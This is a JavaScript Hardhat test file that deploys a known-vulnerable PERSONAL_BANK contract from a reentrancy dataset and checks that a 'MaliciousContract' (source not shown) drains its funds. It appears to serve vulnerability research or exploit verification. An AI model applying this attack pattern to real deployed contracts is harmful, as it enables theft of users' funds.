const { expect } = require("chai");

describe("Reentrancy Attack", function () {
  let PersonalBank;
  let personalBank;
  let MaliciousContract;
  let maliciousContract;
  let LogFile;
  let logFile;

  beforeEach(async function () {
    // Deploy LogFile contract
    LogFile = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:LogFile");
    logFile = await LogFile.deploy();

    // Deploy PersonalBank contract with LogFile address
    PersonalBank = await ethers.getContractFactory("contracts/dataset/reentrancy/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol:PERSONAL_BANK");
    personalBank = await PersonalBank.deploy();
    await personalBank.Initialized();
    await personalBank.SetLogFile(logFile.address); // Set LogFile address after deployment

    // Deploy MaliciousContract with PersonalBank address
    MaliciousContract = await ethers.getContractFactory("MaliciousContract");
    maliciousContract = await MaliciousContract.deploy(personalBank.address);
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to PersonalBank contract
    await personalBank.Deposit({ value: ethers.utils.parseEther("2") });

    // Perform reentrancy attack through MaliciousContract
    await maliciousContract.attack({ value: ethers.utils.parseEther("1") });

    // Check balances after attack
    const personalBankBalance = await ethers.provider.getBalance(personalBank.address);
    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.address);

    // Verify the attack was successful
    expect(personalBankBalance).to.equal(ethers.utils.parseEther("0"));
    expect(maliciousContractBalance).to.equal(ethers.utils.parseEther("1"));
  });
});
